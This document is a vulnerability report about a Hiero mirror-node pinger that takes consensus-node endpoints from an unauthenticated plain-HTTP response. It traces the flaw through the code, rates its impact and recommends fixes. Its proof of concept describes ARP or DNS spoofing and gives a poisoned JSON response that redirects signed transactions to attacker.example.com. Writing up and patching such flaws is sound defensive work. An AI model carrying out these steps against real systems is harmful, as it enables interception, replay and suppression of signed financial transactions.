### Title
Unauthenticated HTTP Mirror-Node Response Poisons gRPC Network Map, Enabling Transaction Hijack

### Summary
When `network=other` is configured, `buildNetworkFromMirrorNodes()` fetches consensus-node endpoints over a plain HTTP connection with no TLS enforcement, no certificate pinning, and no integrity validation of the returned JSON. An unprivileged network-adjacent attacker who can intercept or spoof that HTTP response can inject arbitrary `host:port` entries into the network map, causing `cryptoTransfer.Execute(client)` in `submitWithRetry()` to submit every signed transaction to an attacker-controlled endpoint instead of a real consensus node.

### Finding Description

**Code path:**

1. `pinger/config.go` line 37 — the canonical example URL for `mirrorRest` is `http://mirror-rest:5551` (plaintext HTTP); no validation forces HTTPS.
2. `pinger/mirror_node_client.go` lines 46–47 — the HTTP client is created with only a timeout; no custom `Transport`, no TLS config, no `InsecureSkipVerify` guard, no certificate pinning:
   ```go
   httpClient := &http.Client{Timeout: cfg.mirrorNodeClientTimeout}
   ```
3. `pinger/mirror_node_client.go` lines 100–124 — the JSON body is decoded and every `service_endpoints[].domain_name` / `ip_address_v4` + `port` tuple is inserted into the network map without any allowlist, signature, or cross-check against a known-good set:
   ```go
   addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
   network[addr] = nodeAccountId
   ```
4. `pinger/sdk_client.go` lines 18–22 — the poisoned map is passed directly to the SDK:
   ```go
   netmap, err := buildNetworkFromMirrorNodes(context.Background(), cfg)
   client = hiero.ClientForNetwork(netmap)
   ```
5. `pinger/transfer.go` line 33 — every periodic transfer is submitted through that client:
   ```go
   resp, err := cryptoTransfer.Execute(client)
   ```

**Root cause:** The mirror-node REST response is the sole, unauthenticated source of truth for which gRPC endpoints the pinger will use. There is no HTTPS requirement, no HMAC/signature on the response, and no comparison against a static or operator-supplied allowlist. The only guard (`if len(network) == 0`) is trivially bypassed by returning a single crafted entry.

**Why existing checks fail:** The status-code check (`resp.StatusCode < 200 || resp.StatusCode >= 300`) and the empty-network check (`if len(network) == 0`) both pass when the attacker returns a well-formed 200 response containing one or more fabricated node entries.

### Impact Explanation
- **Transaction DoS:** Signed transactions are delivered to an attacker-controlled endpoint and never reach the real Hiero network. The pinger logs "transfer success" only after a confirmed receipt; without one it retries up to `maxRetries` times — all against the same poisoned map — then gives up. The operator's HBAR is not debited (the transaction never reaches consensus), but the monitoring/health-check purpose of the pinger is completely defeated.
- **Signed-transaction interception:** The attacker receives fully signed `CryptoTransfer` protobuf messages, including operator account ID, destination account ID, amount, and the Ed25519 signature. While the private key cannot be recovered from a single signature, the attacker can forward the transaction to the real network (replay), observe transfer patterns, or selectively drop transactions to manipulate health-check metrics.
- **Severity:** High — complete loss of the pinger's intended function; signed financial transactions exposed to an untrusted party.

### Likelihood Explanation
- **Precondition:** `network=other` must be set (the only code path that calls `buildNetworkFromMirrorNodes`). This is the intended configuration for private/custom deployments, which are exactly the environments where internal HTTP endpoints are common.
- **Attacker capability required:** Network-adjacent, unprivileged. In a Kubernetes or Docker Compose deployment where `mirrorRest` is an in-cluster HTTP service, ARP spoofing, a compromised sidecar, a rogue DNS entry, or a BGP prefix hijack on the cluster network all suffice. No credentials or elevated privileges are needed.
- **Repeatability:** The network map is built once at startup (`newClient` in `main.go` line 41) and never refreshed. A single successful interception of the startup HTTP request permanently poisons the client for the lifetime of the process.

### Recommendation
1. **Enforce HTTPS for `mirrorRest`:** Reject any URL that does not begin with `https://` in `loadConfig()`.
2. **Pin or validate the TLS certificate** of the mirror node REST endpoint (custom `http.Transport` with a pinned CA or leaf cert).
3. **Cross-validate returned endpoints** against a static operator-supplied allowlist (e.g., a `--trusted-nodes` flag) before inserting them into the network map.
4. **Refresh the network map periodically** rather than once at startup, so a poisoned map has a bounded lifetime.
5. As a defense-in-depth measure, log and alert when the set of resolved endpoints changes between refreshes.

### Proof of Concept

**Environment:** pinger deployed with `HIERO_MIRROR_PINGER_NETWORK=other`, `HIERO_MIRROR_PINGER_REST=http://mirror-rest:5551`.

**Steps:**

1. Attacker gains network-adjacent position (e.g., ARP-spoofs the pinger's default gateway, or poisons the in-cluster DNS record for `mirror-rest`).

2. Attacker stands up a fake HTTP server that responds to `GET /api/v1/network/nodes` with:
   ```json
   {
     "nodes": [{
       "node_account_id": "0.0.3",
       "service_endpoints": [{
         "domain_name": "attacker.example.com",
         "ip_address_v4": "",
         "port": 50211
       }]
     }],
     "links": {"next": null}
   }
   ```
   where `attacker.example.com` resolves to an attacker-controlled server with a valid TLS certificate (or a plain gRPC listener if the SDK falls back to insecure).

3. Pinger starts; `buildNetworkFromMirrorNodes` fetches the poisoned response; `ClientForNetwork` builds a map `{"attacker.example.com:50211": AccountID{0,0,3}}`.

4. On the first ticker tick, `submitWithRetry` calls `cryptoTransfer.Execute(client)`. The SDK selects the only available node (`attacker.example.com:50211`), embeds `nodeAccountID=0.0.3` in the transaction, signs it with the operator key, and sends the gRPC `CryptoTransfer` RPC to the attacker's server.

5. Attacker's server receives the fully signed transaction protobuf. It can:
   - Drop it → pinger never gets a receipt → DoS.
   - Forward it to the real network → replay.
   - Log it → operator account ID, destination, amount, and signature are all exposed.

6. All subsequent retries (`maxRetries` = 10 by default) hit the same poisoned endpoint. The map is never rebuilt during the process lifetime.